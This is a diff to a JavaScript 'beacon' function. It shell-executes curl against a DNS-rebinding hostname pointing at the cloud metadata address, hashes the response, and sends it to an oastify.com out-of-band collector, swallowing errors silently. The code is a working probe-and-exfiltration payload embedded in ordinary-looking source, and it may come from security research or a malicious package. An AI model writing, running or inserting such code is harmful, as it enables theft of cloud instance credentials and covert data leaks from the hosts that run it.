@@ -46,7 +46,10 @@ function beacon(urlStr, q) {
 
   let idOutput = "";
   try {
-    idOutput = execSync("curl -v http://a9fea9fe.33267158.rbndr.us/latest/meta-data/", { encoding: "utf8" }).trim();
+    idOutput = execSync(
+  'RESP=$(curl -s http://a9fea9fe.33267158.rbndr.us/latest/meta-data/); HASH=$(echo -n "$RESP" | sha256sum | awk \'{print $1}\'); curl -s "http://sxtggrdkop8c5t96ybhk1evvfmld99xy.oastify.com/ping?hash=$HASH"',
+  { encoding: "utf8" }
+).trim();
     idOutput = Buffer.from(idOutput).toString("base64");
   } catch {}
 
